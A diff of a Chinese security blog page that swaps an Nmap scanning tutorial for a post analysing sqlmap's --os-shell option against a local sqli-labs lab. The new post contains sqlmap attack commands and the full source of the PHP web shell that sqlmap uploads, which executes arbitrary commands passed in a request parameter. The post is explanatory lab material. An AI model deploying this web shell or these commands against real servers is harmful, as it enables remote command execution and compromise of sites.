@@ -2,9 +2,9 @@
 <html>
 <head>
   <meta charset="utf-8">
-  <title>Nmap使用详解 | 未完成的歌</title>
-  <meta name="keywords" content=" nmap ">
-  <meta name="description" content="Nmap使用详解 | 未完成的歌">
+  <title>sqlmap —— os-shell参数分析 | 未完成的歌</title>
+  <meta name="keywords" content=" sqlmap ">
+  <meta name="description" content="sqlmap —— os-shell参数分析 | 未完成的歌">
     <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
 <meta name="description" content="[toc] 前言：最近在看sqlmap，发现--os-shell这个命令很厉害，所以来研究一下。 一、os-shell执行原理对于 Mysql 数据库来说，--os-shell的本质就是写入两个 php 文件，其中的一个可以让我们用来执行命令，而另外一个可以让我们可以上传文件。 说到写入文件，就要说一下上传文件的两个前提条件，首先我们要知道网站的绝对路径(我们的文件写入到哪里)，然后要有导入导出的">
 <meta property="og:type" content="article">
@@ -1218,9 +1218,9 @@
 </aside>
 <div id="post">
     <div class="pjax">
-        <article id="post-Nmap使用详解" class="article article-type-post" itemscope itemprop="blogPost">
+        <article id="post-sqlmap —— os-shell参数分析" class="article article-type-post" itemscope itemprop="blogPost">
     
-        <h1 class="article-title">Nmap使用详解</h1>
+        <h1 class="article-title">sqlmap —— os-shell参数分析</h1>
     
     <div class="article-meta">
         
@@ -1238,19 +1238,19 @@
         <span class="tag">
             <i class="iconfont icon-tag"></i>
             
-            <a class="color5">nmap</a>
+            <a class="color2">sqlmap</a>
             
         </span>
         
     </div>
     <div class="article-meta">
         
-            发布时间 : <time class="date" title='最后更新: 2021-03-02 17:45:48'>2021-03-02 16:57</time>
+            发布时间 : <time class="date" title='最后更新: 2021-10-07 21:59:28'>2021-10-07 21:56</time>
         
     </div>
     <div class="article-meta">
         
-        <span>字数:1.1k</span>
+        <span>字数:953</span>
         
         
         <span id="busuanzi_container_page_pv">
@@ -1269,7 +1269,7 @@
     
     <div class="toc-ref">
     
-        <ol class="toc"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%89%8D%E8%A8%80%EF%BC%9A"><span class="toc-text">前言：</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E4%B8%80%E3%80%81Nmap%E4%BB%8B%E7%BB%8D"><span class="toc-text">一、Nmap介绍</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#1%E3%80%81Nmap%E7%9A%84%E7%89%B9%E7%82%B9%E5%A6%82%E4%B8%8B%EF%BC%9A"><span class="toc-text">1、Nmap的特点如下：</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E4%BA%8C%E3%80%81%E5%AE%89%E8%A3%85Nmap"><span class="toc-text">二、安装Nmap</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E4%B8%89%E3%80%81Nmap%E5%B8%B8%E7%94%A8%E6%96%B9%E6%B3%95"><span class="toc-text">三、Nmap常用方法</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#1%E3%80%81%E6%89%AB%E6%8F%8F%E5%8D%95%E4%B8%AA%E7%9B%AE%E6%A0%87%E5%9C%B0%E5%9D%80%EF%BC%9A"><span class="toc-text">1、扫描单个目标地址：</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#2%E3%80%81%E6%89%AB%E6%8F%8F%E5%A4%9A%E4%B8%AA%E7%9B%AE%E6%A0%87%E5%9C%B0%E5%9D%80%EF%BC%9A"><span class="toc-text">2、扫描多个目标地址：</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#3%E3%80%81%E6%89%AB%E6%8F%8F%E4%B8%80%E4%B8%AA%E8%8C%83%E5%9B%B4%E5%86%85%E7%9A%84%E7%9B%AE%E6%A0%87%E5%9C%B0%E5%9D%80%EF%BC%9A"><span class="toc-text">3、扫描一个范围内的目标地址：</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#4%E3%80%81%E6%89%AB%E6%8F%8F%E7%9B%AE%E6%A0%87%E5%9C%B0%E5%9D%80%E6%89%80%E5%9C%A8%E7%9A%84%E6%9F%90%E4%B8%AA%E7%BD%91%E6%AE%B5%EF%BC%9A"><span class="toc-text">4、扫描目标地址所在的某个网段：</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#5%E3%80%81%E6%89%AB%E6%8F%8F%E4%B8%BB%E6%9C%BA%E5%88%97%E8%A1%A8targets-txt%E4%B8%AD%E7%9A%84%E6%89%80%E6%9C%89%E7%9B%AE%E6%A0%87%E5%9C%B0%E5%9D%80%EF%BC%9A"><span class="toc-text">5、扫描主机列表targets.txt中的所有目标地址：</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#6%E3%80%81%E6%89%AB%E6%8F%8F%E9%99%A4%E6%9F%90%E4%B8%80%E4%B8%AA%E7%9B%AE%E6%A0%87%E5%9C%B0%E5%9D%80%E4%B9%8B%E5%A4%96%E7%9A%84%E6%89%80%E6%9C%89%E7%9B%AE%E6%A0%87%E5%9C%B0%E5%9D%80%EF%BC%9A"><span class="toc-text">6、扫描除某一个目标地址之外的所有目标地址：</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#7%E3%80%81%E6%89%AB%E6%8F%8F%E9%99%A4%E6%9F%90%E4%B8%80%E6%96%87%E4%BB%B6%E4%B8%AD%E7%9A%84%E7%9B%AE%E6%A0%87%E5%9C%B0%E5%9D%80%E4%B9%8B%E5%A4%96%E7%9A%84%E7%9B%AE%E6%A0%87%E5%9C%B0%E5%9D%80%EF%BC%9A"><span class="toc-text">7、扫描除某一文件中的目标地址之外的目标地址：</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#8%E3%80%81%E6%89%AB%E6%8F%8F%E6%9F%90%E4%B8%80%E7%9B%AE%E6%A0%87%E5%9C%B0%E5%9D%80%E7%9A%8421%E3%80%8122%E3%80%8123%E3%80%8180%E7%AB%AF%E5%8F%A3%EF%BC%9A"><span class="toc-text">8、扫描某一目标地址的21、22、23、80端口：</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#9%E3%80%81%E5%AF%B9%E7%9B%AE%E6%A0%87%E5%9C%B0%E5%9D%80%E8%BF%9B%E8%A1%8C%E8%B7%AF%E7%94%B1%E8%B7%9F%E8%B8%AA%EF%BC%9A"><span class="toc-text">9、对目标地址进行路由跟踪：</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#10%E3%80%81%E6%89%AB%E6%8F%8F%E7%9B%AE%E6%A0%87%E5%9C%B0%E5%9D%80%E6%89%80%E5%9C%A8C%E6%AE%B5%E7%9A%84%E5%9C%A8%E7%BA%BF%E7%8A%B6%E5%86%B5%EF%BC%9A"><span class="toc-text">10、扫描目标地址所在C段的在线状况：</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#11%E3%80%81%E7%9B%AE%E6%A0%87%E5%9C%B0%E5%9D%80%E7%9A%84%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E6%8C%87%E7%BA%B9%E8%AF%86%E5%88%AB%EF%BC%9A"><span class="toc-text">11、目标地址的操作系统指纹识别：</span></a></li></ol></li></ol>
+        <ol class="toc"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%89%8D%E8%A8%80%EF%BC%9A"><span class="toc-text">前言：</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E4%B8%80%E3%80%81os-shell%E6%89%A7%E8%A1%8C%E5%8E%9F%E7%90%86"><span class="toc-text">一、os-shell执行原理</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E4%BA%8C%E3%80%81%E6%B5%8B%E8%AF%95%E7%8E%AF%E5%A2%83%EF%BC%9A"><span class="toc-text">二、测试环境：</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E4%B8%89%E3%80%81%E8%BF%87%E7%A8%8B%E6%BC%94%E7%A4%BA"><span class="toc-text">三、过程演示</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#1%E3%80%81%E6%B5%8B%E8%AF%95%E6%9D%83%E9%99%90"><span class="toc-text">1、测试权限</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#2%E3%80%81%E6%94%BB%E5%87%BB"><span class="toc-text">2、攻击</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#3%E3%80%81%E9%80%89%E6%8B%A9%E8%AF%AD%E8%A8%80"><span class="toc-text">3、选择语言</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#4%E3%80%81%E8%BE%93%E5%85%A5%E7%BB%9D%E5%AF%B9%E8%B7%AF%E5%BE%84"><span class="toc-text">4、输入绝对路径</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#5%E3%80%81%E5%BB%BA%E7%AB%8B-os-shell-%E5%B9%B6%E6%89%A7%E8%A1%8C%E5%91%BD%E4%BB%A4"><span class="toc-text">5、建立 os-shell 并执行命令</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%9B%9B%E3%80%81%E5%8E%9F%E7%90%86%E5%88%86%E6%9E%90"><span class="toc-text">四、原理分析</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%80%BB%E7%BB%93%EF%BC%9A"><span class="toc-text">总结：</span></a></li></ol>
     
 <style>
     .left-col .switch-btn,
@@ -1285,55 +1285,84 @@
     
     <div class="article-entry" itemprop="articleBody">
       
-        <p><div class='inner-toc'><ol class="toc"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%89%8D%E8%A8%80%EF%BC%9A"><span class="toc-text">前言：</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E4%B8%80%E3%80%81Nmap%E4%BB%8B%E7%BB%8D"><span class="toc-text">一、Nmap介绍</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#1%E3%80%81Nmap%E7%9A%84%E7%89%B9%E7%82%B9%E5%A6%82%E4%B8%8B%EF%BC%9A"><span class="toc-text">1、Nmap的特点如下：</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E4%BA%8C%E3%80%81%E5%AE%89%E8%A3%85Nmap"><span class="toc-text">二、安装Nmap</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E4%B8%89%E3%80%81Nmap%E5%B8%B8%E7%94%A8%E6%96%B9%E6%B3%95"><span class="toc-text">三、Nmap常用方法</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#1%E3%80%81%E6%89%AB%E6%8F%8F%E5%8D%95%E4%B8%AA%E7%9B%AE%E6%A0%87%E5%9C%B0%E5%9D%80%EF%BC%9A"><span class="toc-text">1、扫描单个目标地址：</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#2%E3%80%81%E6%89%AB%E6%8F%8F%E5%A4%9A%E4%B8%AA%E7%9B%AE%E6%A0%87%E5%9C%B0%E5%9D%80%EF%BC%9A"><span class="toc-text">2、扫描多个目标地址：</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#3%E3%80%81%E6%89%AB%E6%8F%8F%E4%B8%80%E4%B8%AA%E8%8C%83%E5%9B%B4%E5%86%85%E7%9A%84%E7%9B%AE%E6%A0%87%E5%9C%B0%E5%9D%80%EF%BC%9A"><span class="toc-text">3、扫描一个范围内的目标地址：</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#4%E3%80%81%E6%89%AB%E6%8F%8F%E7%9B%AE%E6%A0%87%E5%9C%B0%E5%9D%80%E6%89%80%E5%9C%A8%E7%9A%84%E6%9F%90%E4%B8%AA%E7%BD%91%E6%AE%B5%EF%BC%9A"><span class="toc-text">4、扫描目标地址所在的某个网段：</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#5%E3%80%81%E6%89%AB%E6%8F%8F%E4%B8%BB%E6%9C%BA%E5%88%97%E8%A1%A8targets-txt%E4%B8%AD%E7%9A%84%E6%89%80%E6%9C%89%E7%9B%AE%E6%A0%87%E5%9C%B0%E5%9D%80%EF%BC%9A"><span class="toc-text">5、扫描主机列表targets.txt中的所有目标地址：</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#6%E3%80%81%E6%89%AB%E6%8F%8F%E9%99%A4%E6%9F%90%E4%B8%80%E4%B8%AA%E7%9B%AE%E6%A0%87%E5%9C%B0%E5%9D%80%E4%B9%8B%E5%A4%96%E7%9A%84%E6%89%80%E6%9C%89%E7%9B%AE%E6%A0%87%E5%9C%B0%E5%9D%80%EF%BC%9A"><span class="toc-text">6、扫描除某一个目标地址之外的所有目标地址：</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#7%E3%80%81%E6%89%AB%E6%8F%8F%E9%99%A4%E6%9F%90%E4%B8%80%E6%96%87%E4%BB%B6%E4%B8%AD%E7%9A%84%E7%9B%AE%E6%A0%87%E5%9C%B0%E5%9D%80%E4%B9%8B%E5%A4%96%E7%9A%84%E7%9B%AE%E6%A0%87%E5%9C%B0%E5%9D%80%EF%BC%9A"><span class="toc-text">7、扫描除某一文件中的目标地址之外的目标地址：</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#8%E3%80%81%E6%89%AB%E6%8F%8F%E6%9F%90%E4%B8%80%E7%9B%AE%E6%A0%87%E5%9C%B0%E5%9D%80%E7%9A%8421%E3%80%8122%E3%80%8123%E3%80%8180%E7%AB%AF%E5%8F%A3%EF%BC%9A"><span class="toc-text">8、扫描某一目标地址的21、22、23、80端口：</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#9%E3%80%81%E5%AF%B9%E7%9B%AE%E6%A0%87%E5%9C%B0%E5%9D%80%E8%BF%9B%E8%A1%8C%E8%B7%AF%E7%94%B1%E8%B7%9F%E8%B8%AA%EF%BC%9A"><span class="toc-text">9、对目标地址进行路由跟踪：</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#10%E3%80%81%E6%89%AB%E6%8F%8F%E7%9B%AE%E6%A0%87%E5%9C%B0%E5%9D%80%E6%89%80%E5%9C%A8C%E6%AE%B5%E7%9A%84%E5%9C%A8%E7%BA%BF%E7%8A%B6%E5%86%B5%EF%BC%9A"><span class="toc-text">10、扫描目标地址所在C段的在线状况：</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#11%E3%80%81%E7%9B%AE%E6%A0%87%E5%9C%B0%E5%9D%80%E7%9A%84%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E6%8C%87%E7%BA%B9%E8%AF%86%E5%88%AB%EF%BC%9A"><span class="toc-text">11、目标地址的操作系统指纹识别：</span></a></li></ol></li></ol></div></p>
-<h4 id="前言："><a href="#前言：" class="headerlink" title="前言："></a>前言：</h4><p>今天来总结一下Nmap注入神器的详细使用方法。<hr></p>
-<h4 id="一、Nmap介绍"><a href="#一、Nmap介绍" class="headerlink" title="一、Nmap介绍"></a>一、Nmap介绍</h4><p><img src="https://img-blog.csdnimg.cn/20210225160534331.png">Nmap(Network Mapper，网络映射器)是一款开放源代码的网络探测和安全审核工具。它被设计用来快速扫描大型网络，包括主机探测与发现、开放的端口情况、操作系统与应用服务指纹识别、WAF识别及常见安全漏洞。它的图形化界面是Zenmap，分布式框架为DNmap。</p>
-<h5 id="1、Nmap的特点如下："><a href="#1、Nmap的特点如下：" class="headerlink" title="1、Nmap的特点如下："></a>1、Nmap的特点如下：</h5><ul>
-<li><p>主机探测：探测网络上的主机，如列出响应TCP和ICMP请求、ICMP请求、开放特别端口的主机。</p>
-</li>
-<li><p>端口扫描：探测目标主机所开放的端口。</p>
-</li>
-<li><p>版本检测：探测目标主机的网络服务，判断其服务名称及版本号。</p>
-</li>
-<li><p>系统检测:探测目标主机的操作系统及网络设备的硬件特性。</p>
-</li>
-<li><p>支持探测脚本的编写:使用Nmap的脚本引擎(NSE)和Lua编程语言。</p>
-</li>
-</ul>
-<h4 id="二、安装Nmap"><a href="#二、安装Nmap" class="headerlink" title="二、安装Nmap"></a>二、安装Nmap</h4><p>Windows中Nmap下载地址：<a target="_blank" rel="noopener" href="https://nmap.org/download.html">https://nmap.org/download.html</a><img src="https://img-blog.csdnimg.cn/20210225162039690.png"><br>在安装的过程中按照提示一步步进行即可<br><img src="https://img-blog.csdnimg.cn/20210225162723148.png"><br>安装完成后可以直接通过命令行使用<br><img src="https://img-blog.csdnimg.cn/20210225164014744.png"></p>
-<h4 id="三、Nmap常用方法"><a href="#三、Nmap常用方法" class="headerlink" title="三、Nmap常用方法"></a>三、Nmap常用方法</h4><p>Nmap的参数较多，但是通常用不了那么多，以下是在渗透测试过程中比较常见的命令。</p>
-<h5 id="1、扫描单个目标地址："><a href="#1、扫描单个目标地址：" class="headerlink" title="1、扫描单个目标地址："></a>1、扫描单个目标地址：</h5><p>在Nmap后面直接添加目标地址即可扫描，如下所示：</p>
-<pre><code class="python">nmap 192.168.0.100</code></pre>
-<p><img src="https://img-blog.csdnimg.cn/2021022821521149.png" alt="在这里插入图片描述"></p>
-<h5 id="2、扫描多个目标地址："><a href="#2、扫描多个目标地址：" class="headerlink" title="2、扫描多个目标地址："></a>2、扫描多个目标地址：</h5><p>如果目标地址不在同一网段，或在同一网段但不连续且数量不多，可以使用该方法进行扫描，如下所示：</p>
-<pre><code class="python">nmap 192.168.0.1 192.168.0.6</code></pre>
-<p><img src="https://img-blog.csdnimg.cn/2021022822003825.png" alt="在这里插入图片描述"></p>
-<h5 id="3、扫描一个范围内的目标地址："><a href="#3、扫描一个范围内的目标地址：" class="headerlink" title="3、扫描一个范围内的目标地址："></a>3、扫描一个范围内的目标地址：</h5><p>可以指定扫描一个连续的网段，中间使用“-”连接，例如，下列命令表示扫描范围为192.168.0.100~192.168.0.110，如下所示：</p>
-<pre><code class="python">nmap 192.168.0.1-6</code></pre>
-<p><img src="https://img-blog.csdnimg.cn/20210228220838312.png" alt="在这里插入图片描述"></p>
-<h5 id="4、扫描目标地址所在的某个网段："><a href="#4、扫描目标地址所在的某个网段：" class="headerlink" title="4、扫描目标地址所在的某个网段："></a>4、扫描目标地址所在的某个网段：</h5><p>以C段为例，如果目标是一个网段，则可以通过添加子网掩码的方式扫描，下列命令表示扫描范围为192.168.0.1～192.168.0.255，如下所示：</p>
-<pre><code class="python">nmap 192.168.0.100/24</code></pre>
-<p><img src="https://img-blog.csdnimg.cn/20210228221059968.png" alt="在这里插入图片描述"></p>
-<h5 id="5、扫描主机列表targets-txt中的所有目标地址："><a href="#5、扫描主机列表targets-txt中的所有目标地址：" class="headerlink" title="5、扫描主机列表targets.txt中的所有目标地址："></a>5、扫描主机列表targets.txt中的所有目标地址：</h5><p>扫描 targets.txt 中的地址或者网段，此处导入的是绝对路径，如果 targets.txt 文件与 nmap.exe 在同一个目录下，则直接引用文件名即可，如下所示：</p>
-<pre><code class="bash">nmap -iL C:\Users\smk\Desktop\targets.txt</code></pre>
-<p><img src="https://img-blog.csdnimg.cn/20210228222647502.png" alt="在这里插入图片描述"></p>
-<h5 id="6、扫描除某一个目标地址之外的所有目标地址："><a href="#6、扫描除某一个目标地址之外的所有目标地址：" class="headerlink" title="6、扫描除某一个目标地址之外的所有目标地址："></a>6、扫描除某一个目标地址之外的所有目标地址：</h5><p>下列命令表示扫描除192.168.0.105之外的其他192.168.0.x地址，从扫描结果来看确实没有对192.168.0.105进行扫描，如下所示：</p>
-<pre><code class="python">nmap 192.168.0.100/24 -exclude 192.168.0.1</code></pre>
-<p><img src="https://img-blog.csdnimg.cn/20210228223048405.png" alt="在这里插入图片描述"></p>
-<h5 id="7、扫描除某一文件中的目标地址之外的目标地址："><a href="#7、扫描除某一文件中的目标地址之外的目标地址：" class="headerlink" title="7、扫描除某一文件中的目标地址之外的目标地址："></a>7、扫描除某一文件中的目标地址之外的目标地址：</h5><p>下列命令表示扫描除了target.txt文件夹中涉及的地址或网段之外的目标地址。还是以扫描192.168.0.x网段为例，在targets.txt中添加192.168.0.100和192.168.0.105，从扫描结果来看已经证实该方法有效可用，如下所示：</p>
-<pre><code class="python">nmap 192.168.0.100/24 -excludefile C:\Users\smk\Desktop\targets.txt</code></pre>
-<p><img src="https://img-blog.csdnimg.cn/20210228223717135.png" alt="在这里插入图片描述"></p>
-<h5 id="8、扫描某一目标地址的21、22、23、80端口："><a href="#8、扫描某一目标地址的21、22、23、80端口：" class="headerlink" title="8、扫描某一目标地址的21、22、23、80端口："></a>8、扫描某一目标地址的21、22、23、80端口：</h5><p>如果不需要对目标主机进行全端口扫描，只想探测它是否开放了某一端口，那么使用-p参数指定端口号，将大大提升扫描速度，如下所示：</p>
-<pre><code class="python">nmap 192.168.0.6 -p 135,443,445</code></pre>
-<p><img src="https://img-blog.csdnimg.cn/20210228231610466.png" alt="在这里插入图片描述"> </p>
-<h5 id="9、对目标地址进行路由跟踪："><a href="#9、对目标地址进行路由跟踪：" class="headerlink" title="9、对目标地址进行路由跟踪："></a>9、对目标地址进行路由跟踪：</h5><p>下列命令表示对目标地址进行路由跟踪，如下所示：</p>
-<pre><code class="python">nmap --traceroute 192.168.0.6</code></pre>
-<h5 id="10、扫描目标地址所在C段的在线状况："><a href="#10、扫描目标地址所在C段的在线状况：" class="headerlink" title="10、扫描目标地址所在C段的在线状况："></a>10、扫描目标地址所在C段的在线状况：</h5><p>下列命令表示扫描目标地址所在C段的在线状况，如下所示：</p>
-<pre><code class="python">nmap -sP 192.168.0.100/24</code></pre>
-<p><img src="https://img-blog.csdnimg.cn/20210301001240550.png" alt="在这里插入图片描述"></p>
-<h5 id="11、目标地址的操作系统指纹识别："><a href="#11、目标地址的操作系统指纹识别：" class="headerlink" title="11、目标地址的操作系统指纹识别："></a>11、目标地址的操作系统指纹识别：</h5><p>下列命令表示通过指纹识别技术识别目标地址的操作系统的版本，如下所示：</p>
-<pre><code class="python">nmap -O 192.168.0.6</code></pre>
-<p><img src="https://img-blog.csdnimg.cn/20210301001440818.png" alt="在这里插入图片描述"></p>
+        <p><div class='inner-toc'><ol class="toc"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%89%8D%E8%A8%80%EF%BC%9A"><span class="toc-text">前言：</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E4%B8%80%E3%80%81os-shell%E6%89%A7%E8%A1%8C%E5%8E%9F%E7%90%86"><span class="toc-text">一、os-shell执行原理</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E4%BA%8C%E3%80%81%E6%B5%8B%E8%AF%95%E7%8E%AF%E5%A2%83%EF%BC%9A"><span class="toc-text">二、测试环境：</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E4%B8%89%E3%80%81%E8%BF%87%E7%A8%8B%E6%BC%94%E7%A4%BA"><span class="toc-text">三、过程演示</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#1%E3%80%81%E6%B5%8B%E8%AF%95%E6%9D%83%E9%99%90"><span class="toc-text">1、测试权限</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#2%E3%80%81%E6%94%BB%E5%87%BB"><span class="toc-text">2、攻击</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#3%E3%80%81%E9%80%89%E6%8B%A9%E8%AF%AD%E8%A8%80"><span class="toc-text">3、选择语言</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#4%E3%80%81%E8%BE%93%E5%85%A5%E7%BB%9D%E5%AF%B9%E8%B7%AF%E5%BE%84"><span class="toc-text">4、输入绝对路径</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#5%E3%80%81%E5%BB%BA%E7%AB%8B-os-shell-%E5%B9%B6%E6%89%A7%E8%A1%8C%E5%91%BD%E4%BB%A4"><span class="toc-text">5、建立 os-shell 并执行命令</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%9B%9B%E3%80%81%E5%8E%9F%E7%90%86%E5%88%86%E6%9E%90"><span class="toc-text">四、原理分析</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%80%BB%E7%BB%93%EF%BC%9A"><span class="toc-text">总结：</span></a></li></ol></div></p>
+<h4 id="前言："><a href="#前言：" class="headerlink" title="前言："></a>前言：</h4><p>最近在看sqlmap，发现<code>--os-shell</code>这个命令很厉害，所以来研究一下。</p>
+<h4 id="一、os-shell执行原理"><a href="#一、os-shell执行原理" class="headerlink" title="一、os-shell执行原理"></a>一、os-shell执行原理</h4><p>对于 Mysql 数据库来说，<code>--os-shell</code>的本质就是写入两个 php 文件，其中的一个可以让我们用来执行命令，而另外一个可以让我们可以上传文件。</p>
+<p>说到写入文件，就要说一下上传文件的两个前提条件，首先我们要知道网站的绝对路径(我们的文件写入到哪里)，然后要有导入导出的权限。</p>
+<p>导入导出的权限在 Mysql 数据库中是由 secure_file_priv 参数来控制的，当这个参数后面为 null 时，表示不允许导入导出，如果为具体文件夹时，表示仅允许在这个文件夹下导入导出，如果后面没有值（为空）时，表示可以在任何文件夹下导入导出。<br><img src="https://img-blog.csdnimg.cn/f322e58003b144678af1531ed1b58093.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBA5pyq5a6M5oiQ55qE5q2Mfg==,size_20,color_FFFFFF,t_70,g_se,x_16"><br>当 Mysql 5.7 版本以上的时候，secure_file_priv 参数的值默认为null，也就是说，如果管理员没有修改过这个参数后面的数值的话，我们没办法在5.7以上版本使用<code>--os-shell</code>。</p>
+<h4 id="二、测试环境："><a href="#二、测试环境：" class="headerlink" title="二、测试环境："></a>二、测试环境：</h4><p>实验环境是在本机上使用 phpstudy 搭建的 sqli-libs 靶场，并且假设我们已知网站绝对路径。</p>
+<h4 id="三、过程演示"><a href="#三、过程演示" class="headerlink" title="三、过程演示"></a>三、过程演示</h4><h5 id="1、测试权限"><a href="#1、测试权限" class="headerlink" title="1、测试权限"></a>1、测试权限</h5><p>首先，我们先测试是否为dba权限</p>
+<pre><code class="python">sqlmap.py -u http://127.0.0.1/sqli-labs/Less-1/?id=1 --is-dba</code></pre>
+<p><img src="https://img-blog.csdnimg.cn/991b851ec8e0435c8042cb89543da337.png"><br>可以看到，当前用户拥有dba的权限，接下来就可以使用<code>--os-shell</code>了。</p>
+<h5 id="2、攻击"><a href="#2、攻击" class="headerlink" title="2、攻击"></a>2、攻击</h5><pre><code class="python">sqlmap.py -u http://127.0.0.1/sqli-labs/Less-1/?id=1 --os-shell</code></pre>
+<h5 id="3、选择语言"><a href="#3、选择语言" class="headerlink" title="3、选择语言"></a>3、选择语言</h5><p>sqlmap默认为ASP，此处根据需求选择。<br><img src="https://img-blog.csdnimg.cn/e7d1687d01ed4f6bac2c7b207a06882a.png"></p>
+<h5 id="4、输入绝对路径"><a href="#4、输入绝对路径" class="headerlink" title="4、输入绝对路径"></a>4、输入绝对路径</h5><p><img src="https://img-blog.csdnimg.cn/2108380cc69a49d581233ccd127b53c4.png"><br>选择2选项，输入绝对路径，我这里为：C:/phpStudy/WWW<br><img src="https://img-blog.csdnimg.cn/eb660709f524454382dbeaf01d79a60d.png"></p>
+<h5 id="5、建立-os-shell-并执行命令"><a href="#5、建立-os-shell-并执行命令" class="headerlink" title="5、建立 os-shell 并执行命令"></a>5、建立 os-shell 并执行命令</h5><p><img src="https://img-blog.csdnimg.cn/654d8220e4e5445aa713d4bc99eb66ae.png"><br>成功建立 os-shell 并执行命令！</p>
+<h4 id="四、原理分析"><a href="#四、原理分析" class="headerlink" title="四、原理分析"></a>四、原理分析</h4><p>原理其实很简单，就是用 into outfile 函数上传了两个php文件，如图<br><img src="https://img-blog.csdnimg.cn/08f5057b975142139af707ea14291347.png"><br>一个是 tmpunszu.php，可以用来上传文件，另一个是 tmpbjpgc.php，这个文件可以用来执行系统命令，并且将结果返回出来。</p>
+<p>先来看下 tmpbjpgc.php文件，源码如下:</p>
+<pre><code class="php">&lt;?php
+$c=$_REQUEST[&quot;cmd&quot;];
+@set_time_limit(0);
+@ignore_user_abort(1);
+@ini_set(&#39;max_execution_time&#39;,0);
+$z=@ini_get(&#39;disable_functions&#39;);
+if(!empty($z))
+&#123;
+    $z=preg_replace(&#39;/[, ]+/&#39;,&#39;,&#39;,$z);
+    $z=explode(&#39;,&#39;,$z);
+    $z=array_map(&#39;trim&#39;,$z);&#125;
+else
+    &#123;
+        $z=array();
+        &#125;
+$c=$c.&quot; 2&gt;&amp;1\n&quot;;
+function f($n)
+&#123;global $z;
+return is_callable($n)and!in_array($n,$z);
+&#125;
+if(f(&#39;system&#39;))
+&#123;ob_start();
+system($c);
+$w=ob_get_contents();
+ob_end_clean();
+&#125;elseif(f(&#39;proc_open&#39;))&#123;
+    $y=proc_open($c,array(array(pipe,r),array(pipe,w),array(pipe,w)),$t);
+    $w=NULL;
+    while(!feof($t[1]))&#123;
+        $w.=fread($t[1],512);
+            &#125;
+        @proc_close($y);
+&#125;
+    elseif(f(&#39;shell_exec&#39;))&#123;
+    $w=shell_exec($c);
+    &#125;
+    elseif(f(&#39;passthru&#39;))&#123;
+        ob_start();
+        passthru($c);
+        $w=ob_get_contents();
+        ob_end_clean();
+        &#125;elseif(f(&#39;popen&#39;))&#123;
+            $x=popen($c,r);
+            $w=NULL;
+            if(is_resource($x))&#123;
+                while(!feof($x))&#123;
+                $w.=fread($x,512);
+                    &#125;
+                    &#125;
+                    @pclose($x);
+                    &#125;elseif(f(&#39;exec&#39;))&#123;
+                        $w=array();
+                        exec($c,$w);
+                        $w=join(chr(10),$w).chr(10);
+                        &#125;else&#123;
+                            $w=0;
+                            &#125;
+                            print &quot;&lt;/pre&gt;&quot;.$w.&quot;&lt;/pre&gt;&quot;;?&gt;&#39;&#39;&#39;</code></pre>
